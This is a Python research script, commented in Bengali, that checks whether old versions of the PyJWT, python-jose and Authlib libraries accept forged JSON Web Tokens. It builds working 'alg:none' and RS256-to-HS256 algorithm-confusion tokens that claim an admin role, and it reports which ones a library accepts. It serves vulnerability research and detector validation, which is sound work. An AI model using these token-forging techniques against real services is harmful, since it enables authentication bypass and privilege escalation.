"""
Phase B1 — সত্যিকারের পুরনো-দুর্বল library version-এ real true-positive
=========================================================================
কেন: এতদিন সব true-positive এসেছে আমাদের নিজের লেখা VULN-target থেকে — reviewer
     বলবে "নিজে দুর্বল বানিয়ে নিজেই ধরলে, circular"। এখানে documented-দুর্বল
     *পুরনো library version*-এ একই detector চালিয়ে দেখাই: real bug reproduce হয়।

এই script standalone: যে venv-এ চলবে, সেখানকার একমাত্র JWT library খুঁজে নেয়
(pyjwt / python-jose / authlib), তার version ছাপে, তারপর একই forged corpus চালায়।
তাই আলাদা _oldlibs/venv_*/bin/python দিয়ে চালানো যায়।

আক্রমণ (সব DY-সীমার ভেতরে — attacker শুধু issuer-এর PUBLIC key জানে):
  1. alg:none — signature বাদ, role=admin।
  2. Algorithm Confusion (RS256→HS256) — RSA public key কে HMAC secret ধরে HS256
     সাইন করা role=admin টোকেন। verifier RSA public key ধরে, ভুলে HS256-ও allow করে।

ground truth: দুটোই forged (issuer সাইন করেনি), attack_role=admin। library ACCEPT
করে role=admin দিলে = শ্রেণী-A = real true-positive (দুর্বল version)। REJECT = নিরাপদ।
"""
import json, hmac, hashlib, base64, sys, time
from importlib.metadata import version, PackageNotFoundError
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa


def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


# ── issuer RSA keypair (verifier এটার public key ধরে আছে) ──
ISSUER = rsa.generate_private_key(65537, 2048)
PUB_PEM = ISSUER.public_key().public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)


def _assemble(alg, payload, sig: bytes) -> str:
    h = b64url(json.dumps({"alg": alg, "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{b64url(sig)}"


ADMIN = {"role": "admin", "iss": "real-issuer"}

# forged টোকেন: (নাম, token, verifier-key, allow-list)
def forged_tokens():
    # 1. alg:none
    h = b64url(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64url(json.dumps(ADMIN, separators=(",", ":")).encode())
    yield ("alg:none", f"{h}.{p}.", PUB_PEM, ["RS256", "HS256"])
    # 2. algorithm confusion RS256→HS256 (public key = HMAC secret)
    si = ".".join(_assemble("HS256", ADMIN, b"").split(".")[:2]).encode()
    sig = hmac.new(PUB_PEM, si, hashlib.sha256).digest()
    yield ("alg-confusion", _assemble("HS256", ADMIN, sig), PUB_PEM, ["RS256", "HS256"])


# ─────────────────────────────────────────────────────────────
# একমাত্র installed library খুঁজে verify-adapter দাও
# ─────────────────────────────────────────────────────────────
def detect_library():
    try:
        import jwt as pyjwt
        if hasattr(pyjwt, "decode"):
            def verify(token, key, algs):
                key = key.decode() if isinstance(key, bytes) else key
                try:
                    return pyjwt.decode(token, key, algorithms=algs)      # আধুনিক API
                except TypeError:
                    return pyjwt.decode(token, key)                        # PyJWT 0.x: algorithms kwarg নেই
            try:
                v = version("pyjwt")
            except PackageNotFoundError:
                v = getattr(pyjwt, "__version__", "?")
            return f"PyJWT {v}", verify
    except Exception:
        pass
    try:
        from jose import jwt as jose_jwt
        def verify(token, key, algs):
            key = key.decode() if isinstance(key, bytes) else key
            return jose_jwt.decode(token, key, algorithms=algs)
        return f"python-jose {version('python-jose')}", verify
    except Exception:
        pass
    try:
        from authlib.jose import jwt as authlib_jwt
        def verify(token, key, algs):
            claims = authlib_jwt.decode(token, key)
            claims.validate()
            return dict(claims)
        return f"Authlib {version('authlib')}", verify
    except Exception:
        pass
    raise SystemExit("কোনো JWT library পাওয়া গেল না এই venv-এ")


def classify(name, accepted, claims, err):
    """ground-truth oracle (provenance): forged টোকেন admin-role-সহ গৃহীত = শ্রেণী-A।"""
    if accepted and (claims or {}).get("role") == "admin":
        return "A", "🚨 REAL true-positive: forged admin টোকেন গৃহীত"
    if accepted:
        return "?", f"গৃহীত কিন্তু role admin নয়: {claims}"
    return "OK", f"সঠিকভাবে বাতিল: {err[:60]}"


def main():
    lib, verify = detect_library()
    print("=" * 70)
    print(f"Phase B1 — target: {lib}")
    print("=" * 70)
    found = 0
    for name, token, key, algs in forged_tokens():
        t0 = time.perf_counter()
        try:
            claims = verify(token, key, algs)
            accepted, err = True, ""
        except Exception as e:
            claims, accepted, err = {}, False, f"{type(e).__name__}: {e}"
        klass, note = classify(name, accepted, claims, err)
        found += klass == "A"
        tag = f"[{klass}]"
        print(f"  {tag:5} {name:16} {'ACCEPT' if accepted else 'REJECT':7} {note}")
    print("-" * 70)
    print(f"→ {lib}: {found}টা real true-positive (শ্রেণী-A)")
    print(f"RESULT\t{lib}\tconfusion_TP={found}")   # orchestrator-এর জন্য parseable
    return lib, found


if __name__ == "__main__":
    main()
